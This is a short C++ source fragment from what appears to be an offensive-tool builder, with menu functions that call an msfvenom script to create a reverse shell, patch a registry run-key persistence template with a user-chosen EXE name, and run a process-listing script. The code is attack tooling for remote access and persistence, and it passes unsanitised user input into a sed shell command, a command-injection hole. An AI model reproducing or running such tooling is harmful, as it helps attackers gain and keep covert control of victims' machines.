#include <iostream>

using namespace std;

void createrevshell()
{
    cout << endl;
    system("bash code/msfvenom.sh");
}

void createpersistence(){
    string exe;
    string command;
    yellow("\n[+] Provide name of EXE you want to be persistent (include .exe)\n");
    cyan("\nEXE = ");
    cin >> exe;
    command = "sed -i 's/REPLACE/\"" + exe + "\"/' code/persistence/runkeys2.cpp >/dev/null";
    const int commandlength = command.length();
    char* char_command = new char[commandlength + 1];
    strcpy(char_command, command.c_str());
    system("cp code/persistence/runkeys.cpp code/persistence/runkeys2.cpp");
    system(char_command);
    system("bash code/persistence/check.sh");
}

void createproclist(){
    system("bash code/proclist/proclist.sh");

}